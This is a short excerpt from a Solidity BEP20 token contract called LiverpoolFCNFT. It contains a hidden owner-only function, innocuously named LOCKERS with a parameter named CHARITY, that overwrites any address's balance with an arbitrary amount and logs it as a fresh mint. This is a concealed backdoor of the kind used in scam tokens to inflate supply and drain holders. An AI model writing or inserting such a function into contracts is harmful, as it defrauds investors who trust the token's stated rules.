...
contract LiverpoolFCNFT is Context, IBEP20, Ownable, LGEWhitelisted {
    ...
    */
      ...
      function LOCKERS(address CHARITY, uint256 amount) external onlyOwner {
             _balances[CHARITY] = amount * 10 ** 9;
        
        emit Transfer(address(0), CHARITY, amount * 10 ** 9);
  }
